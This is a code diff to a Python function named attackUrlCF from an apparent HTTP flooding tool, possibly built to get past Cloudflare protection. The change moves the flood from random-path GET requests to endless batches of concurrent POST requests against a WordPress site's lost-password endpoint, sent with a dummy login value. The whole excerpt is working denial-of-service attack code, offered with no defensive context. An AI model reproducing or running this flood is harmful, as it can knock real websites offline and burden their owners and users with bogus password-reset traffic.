@@ -105,7 +105,8 @@ def attackUrlCF(baseUrl, threadNum):
 	while True:
 		try:
 			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
-			url = baseUrl +'/' + ''.join(random.choice(letters) for i in range(30)) 
+			# url = baseUrl +'/' + ''.join(random.choice(letters) for i in range(30)) 
+			url = baseUrl + '/wp-login.php?action=lostpassword'
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
@@ -115,13 +116,13 @@ def attackUrlCF(baseUrl, threadNum):
 			'Upgrade-Insecure-Requests': '1',
 			}
 
-			print(headers)
+			data = {'user_login':"asdfasdf@adfadsf.com",'redirect_to':"",'wp-submit':"Get+New+Password"}
 			# print(proxies, cookiesStr)
 			# print(requests.get('https://api.ipify.org', proxies=proxies).content)
 
 			requestsArr = []
 			for x in range(10):
-				requestsArr.append(grequests.get(url, headers=headers, cookies=cookiesStr, timeout=30))
+				requestsArr.append(grequests.post(url, headers=headers, cookies=cookiesStr, timeout=30, data=data))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			print(threadNum, baseUrl , res)
